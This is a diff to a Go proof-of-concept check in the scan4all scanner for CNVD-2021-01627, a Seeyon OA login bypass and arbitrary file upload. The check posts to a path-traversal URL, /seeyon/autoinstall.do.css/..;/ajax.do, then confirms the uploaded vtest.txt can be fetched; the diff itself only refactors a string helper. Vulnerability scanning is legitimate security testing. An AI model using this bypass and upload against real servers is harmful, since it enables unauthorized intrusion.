@@ -3,7 +3,6 @@ package seeyon
 import (
 	"fmt"
 	"github.com/hktalent/scan4all/pkg"
-	"strings"
 )
 
 //ajax.do登录绕过&任意文件上传
@@ -13,7 +12,7 @@ func CNVD_2021_01627(u string) bool {
 	if req, err := pkg.HttpRequset(u+"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip", "POST", data, false, nil); err == nil {
 		if req.StatusCode == 500 {
 			if req2, err := pkg.HttpRequset(u+"/seeyon/vtest.txt", "GET", "", false, nil); err == nil {
-				if req2.StatusCode == 200 && strings.Contains(req2.Body, "vtest") {
+				if req2.StatusCode == 200 && pkg.StrContains(req2.Body, "vtest") {
 					pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon CNVD_2021_01627|%s\n", u+"/seeyon/vtest.txt"))
 					return true
 				}
